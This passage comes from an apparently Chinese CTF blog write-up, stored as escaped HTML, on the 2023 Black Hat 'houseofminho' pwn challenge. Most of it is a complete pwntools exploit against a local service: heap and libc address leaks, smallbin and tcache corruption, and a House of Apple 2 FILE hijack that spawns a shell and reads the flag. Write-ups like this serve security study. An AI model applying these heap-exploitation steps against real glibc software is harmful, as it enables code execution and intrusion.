class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free3(<span class=\"number\">0xd59</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0x00</span>) + p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: heap_base + <span class=\"number\">0x380</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc_base + <span class=\"number\">0x219ce0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这里加上了Small bin的伪造</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span> : &#123;</span><br><span class=\"line\">            <span class=\"number\">0x00</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x08</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x10</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x18</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x38</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x40</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x48</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x50</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0x50</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x58</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x60</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            <span class=\"number\">0x68</span>: libc_base + <span class=\"number\">0x219d60</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>此时堆布局如下</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118021620888.png\" alt=\"image-20231118021620888\"></p>\n<p>可以看到出现了错误，不过问题不大，源码时通过BK进行遍历的，在BK位置确实出现了3个Chunk</p>\n<p>此时我们就可以malloc(0x80)命中一次Small bin的0x90</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>那么此时堆块就会变成，下面这样！WoW，我们可以控制Tcache bin 0x90位置的fd指针！并且此时0x90位置的Count有3！！！</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118022002073.png\" alt=\"image-20231118022002073\"></p>\n<p>胜利的曙光就在眼前了，接下来是House of apple 2登场！</p>\n<h2 id=\"House-of-Apple-2\"><a href=\"#House-of-Apple-2\" class=\"headerlink\" title=\"House of Apple 2\"></a>House of Apple 2</h2><p>House of Apple 2的教程见<a href=\"https://bbs.kanxue.com/thread-273832.htm%EF%BC%8C%E8%BF%99%E9%87%8C%E8%86%9C%E6%8B%9C%E4%B8%80%E4%B8%8BOrz\">https://bbs.kanxue.com/thread-273832.htm，这里膜拜一下Orz</a></p>\n<p>经过我的调优可以简化到如下的布局</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system = <span class=\"number\">0x50d60</span> + libc_base</span><br><span class=\"line\">fake_file = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x0</span>: <span class=\"string\">b&quot;  sh;&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: system,</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: fake_file_addr-<span class=\"number\">0x10</span>, <span class=\"comment\"># wide data</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: fake_file_addr+<span class=\"number\">0x100</span>, <span class=\"comment\"># 可写，且内存为0即可</span></span><br><span class=\"line\">    <span class=\"number\">0xD0</span>: fake_file_addr+<span class=\"number\">0x28</span>-<span class=\"number\">0x68</span>, <span class=\"comment\"># wide data vtable</span></span><br><span class=\"line\">    <span class=\"number\">0xD8</span>: libc_base + <span class=\"number\">0x2160C0</span>, <span class=\"comment\"># vtable  </span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>我们需要结合当前的情况在做调整，首先我们需要再次延长可控的空间，方法也简单，毕竟Tcache bin的Count有3，我们可以先伪造一次fd到堆上，再伪造进入<code>_IO_list_all</code></p>\n<p>（为何不劫持Tcache bin管理块呢？因为我们只能拥有一个堆块，需要free之后再次malloc才能控制下一个，一旦劫持到Tcachebin 管理块，没有一个合适的size位置，是无法成功free的）</p>\n<p>由于大小范围可控需要0xe0长度，所以我们第一个堆块需要扩展一次，使用上面的0x50的堆块对下面0x90tcache的溢出修改，使得布局如下图，这样子Chunk 1申请出来的时候，可以保证能控制到Chunk 2的fd，依旧能继续攻击，也能延长可控范围到0xf0，使得攻击成立，而Chunk 1的size改为0x71是为了防止free之后进入0x90导致后面的Chunk无法取出</p>\n<p><img src=\"/p/houseofminho-wp/houseofminho_tcachebin.png\" alt=\"houseofminho_tcachebin\"></p>\n<p>那么经过简单的布置，最终攻击<code>_IO_list_all</code>之后，就完成了House of Apple 2的攻击</p>\n<h1 id=\"完整Exp\"><a href=\"#完整Exp\" class=\"headerlink\" title=\"完整Exp\"></a>完整Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./minho&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5000</span>)</span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;Size [1=small / 2=big]: &quot;</span>, tob(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;Data: &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">size_content, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;Size [1=small / 2=big]: &quot;</span>, size_content)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;Data: &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show2</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show3</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;2&quot;</span> + <span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free3</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free3(<span class=\"number\">0xd59</span>) <span class=\"comment\"># 这一行的作用见上文【伪造Unsorted bin】</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这一部分信息收集见上文【信息收集】</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 见上文【Unlink攻击以及Smallbin伪造攻击实施】</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0x00</span>) + p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: heap_base + <span class=\"number\">0x380</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc_base + <span class=\"number\">0x219ce0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 见上文【修改Small bin】</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span> : &#123;</span><br><span class=\"line\">            <span class=\"number\">0x00</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x08</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x10</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x18</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x38</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x40</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x48</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x50</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0x50</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x58</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x60</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            <span class=\"number\">0x68</span>: libc_base + <span class=\"number\">0x219d60</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">_IO_list_all = libc_base + <span class=\"number\">0x21a680</span></span><br><span class=\"line\">system = <span class=\"number\">0x50d60</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">fake_file = heap_base + <span class=\"number\">0x2e0</span></span><br><span class=\"line\"><span class=\"comment\"># 见上文House of apple 2中解释</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x10</span>+p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>) + p64((heap_base + <span class=\"number\">0x2d0</span> + <span class=\"number\">0x70</span>)^((heap_base)&gt;&gt;<span class=\"number\">12</span>)))</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里是布置House of apple 2</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x0</span>+<span class=\"number\">0x10</span>: <span class=\"string\">b&quot;  sh;&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>+<span class=\"number\">0x10</span>: system,</span><br><span class=\"line\">    <span class=\"number\">0x68</span>: <span class=\"number\">0x71</span>,</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: _IO_list_all ^((heap_base)&gt;&gt;<span class=\"number\">12</span>),</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>-<span class=\"number\">0x60</span>: fake_file-<span class=\"number\">0x10</span>,</span><br><span class=\"line\">    <span class=\"number\">0xd0</span>-<span class=\"number\">0x60</span>: fake_file+<span class=\"number\">0x28</span>-<span class=\"number\">0x68</span>,</span><br><span class=\"line\">    <span class=\"number\">0xD8</span>-<span class=\"number\">0x60</span>: libc_base + <span class=\"number\">0x2160C0</span>, <span class=\"comment\"># jumptable </span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, p64(fake_file))</span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;0&quot;</span>)</span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;cat /flag*&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/houseofminho-wp/image-20231118024517191.png\" alt=\"image-20231118024517191\"></p>\n<p>Flag获得完结撒花！</p>\n","excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这个是2023 black hat第二天的一道0解pwn题</p>\n<p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip\">https://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip</a></p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>出题人很友好的给了源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span 